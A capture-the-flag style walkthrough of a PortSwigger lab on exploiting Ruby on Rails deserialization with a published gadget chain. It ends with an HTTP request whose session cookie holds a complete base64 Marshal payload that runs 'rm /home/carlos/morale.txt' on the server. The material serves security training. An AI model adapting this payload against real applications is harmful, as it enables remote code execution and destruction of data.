
# Exploiting Ruby deserialization using a documented gadget chain

This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

Hint: Try searching for "ruby deserialization gadget chain" online.

---------------------------------------------

References: 

- https://portswigger.net/web-security/deserialization/exploiting

- https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html



![img](images/Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain/1.png)

---------------------------------------------

First intercept a request after logging in:

![img](images/Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain/2.png)


If we decode we can not read the object as it happens in other labs:



![img](images/Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain/3.png)


At the end of this blog we have a script to generate a payload - https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html:



![img](images/Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain/4.png)


It generates an error but the file is deleted:

```
GET /my-account HTTP/2
...
Cookie: session=BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
...
```



![img](images/Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain/5.png)